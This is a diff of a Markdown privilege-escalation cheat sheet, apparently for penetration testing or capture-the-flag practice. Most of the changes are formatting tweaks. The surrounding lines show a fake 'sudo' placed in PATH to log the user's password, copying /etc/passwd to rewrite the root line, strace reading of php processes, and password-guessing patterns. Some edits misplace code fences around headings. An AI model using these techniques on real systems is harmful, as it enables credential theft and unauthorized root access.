@@ -64,13 +64,13 @@ echo $2
 
 ### Find OS Vulnerability
 
-If we run **`uname -a`** and get the OS version, search vulnerabilities.
+If we run **uname -a** and get the OS version, search vulnerabilities.
 
-```txt
+```bash
 Linux examplehost 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-For example above, we can search **`ubuntu 4.4.0-31-generic`** in search engines.
+For example above, we can search **ubuntu 4.4.0-31-generic** in search engines.
 
 <br />
 
@@ -250,7 +250,7 @@ ss -ltp
 
 If we discover a listen port that cannot be accessed externally as below, we can access this port by port forwarding.
 
-```txt
+```bash
 tcp  0  0  127.0.0.1:8080  0.0.0.0:*  LISTEN  -                   
 ```
 
@@ -329,10 +329,10 @@ tcpdump -i lo -A
 ### Override Command
 
 If some command is executed in processes as our current user, we can override the command to our arbitrary command.  
-Assume **`sudo cat /etc/shadow`** command is executed in the process.  
-**`sudo`** command asks the password of the current user. So if we don't have the current user's password yet, worth getting the password.
+Assume **sudo cat /etc/shadow** command is executed in the process.  
+**sudo** command asks the password of the current user. So if we don't have the current user's password yet, worth getting the password.
 
-To do so, we can create the fake **`sudo`** command under the current user’s home directory.
+To do so, we can create the fake **sudo** command under the current user’s home directory.
 
 ```bash
 mkdir /home/<user>/bin
@@ -340,8 +340,8 @@ touch /home/<user>/bin/sudo
 chmod +x /home/<user>/bin/sudo
 ```
 
-Then insert a payload in **`/home/<user>/bin/sudo`**.  
-This **`sudo`** command reads the value of the password in prompt and write the value to **“password.txt”**.
+Then insert a payload in **"/home/<user>/bin/sudo"**.  
+This **"sudo"** command reads the value of the password in prompt and write the value to **“password.txt”**.
 
 ```bash
 #!/bin/bash
@@ -350,7 +350,7 @@ read password
 echo $password >> /home/<user>/password.txt
 ```
 
-In addition, we need to export the **`/home/<user>/bin`** to the PATH on the top of the **`/home/<user>/.bashrc`**.
+In addition, we need to export the **"/home/<user>/bin"** to the PATH on the top of the **"/home/<user>/.bashrc"**.
 
 ```bash
 export PATH=/home/<user>/bin:$PATH
@@ -368,7 +368,7 @@ Now we get the current user password.
 
 ## Process Tracing
 
-Sometimes we can retrieve the sensitive information by reading sequential processes with `stract`.
+Sometimes we can retrieve the sensitive information by reading sequential processes with "stract".
 
 ```bash
 strace -e read -p `ps -ef | grep php | awk '{print $2}'`
@@ -477,7 +477,7 @@ Enter the name of target file: /tmp/id_rsa
 
 ### Pandoc
 
-1. Copy **`/etc/passwd`** and Update the Root Line
+1. Copy **/etc/passwd** and Update the Root Line
 
 ```bash
 cp /etc/passwd .
@@ -776,8 +776,8 @@ echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
     su <new-user>
     ```
 
-<br />
 
+```bash 
 ## Display the Content of Files You Don't Have Permissions
 
 Using **"more"** command.
@@ -792,11 +792,10 @@ The text like "--More--(60%)" will be appeared.
 
 ### 4. Enter ':e ~/somefile'
 
-<br />
-
+```
 ## Password Guessing from Old One
 
-```sh
+```bash
 password2021 -> password2022, password2023
 april123 -> may123, june123
 apple -> banana, orange
